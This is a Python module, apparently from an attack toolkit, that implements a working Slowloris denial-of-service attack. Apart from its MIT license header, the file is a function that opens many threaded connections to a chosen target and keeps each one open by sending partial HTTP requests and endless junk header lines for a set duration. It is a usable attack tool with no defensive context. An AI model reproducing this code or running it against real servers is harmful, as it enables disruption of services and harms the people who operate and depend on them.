#!/usr/bin/env python3

# MIT License
#
# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import random
import time
import socket
from threading import Thread
# Import modules for SLOWLORIS flood
import tools.randomData as randomData

def SLOWLORIS_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting attack...")
	
	threads_list = []

	# SLOWLORIS flood
	def slowloris_flood():
		global FINISH
		# Init socket
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(4)
		sock.connect((target_ip, target_port))

		sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
		sock.send("User-Agent: {}\r\n".format(randomData.random_useragent()).encode("utf-8"))
		sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

		while not FINISH:
			if not FINISH:
				# Packet
				try:
					sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
				except socket.error:
					print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to create socket!")
				else:
					print("\033[1;34m"+"[*]"+"\033[0m"+" Sending to " + target + "...")

	# Start threads
	for thread in range(0, threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Starting thread " + str(thread) + "...")
		t = Thread(target = slowloris_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected seconds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;33m"+"[!]"+"\033[0m"+" SLOWLORIS attack stopped!")
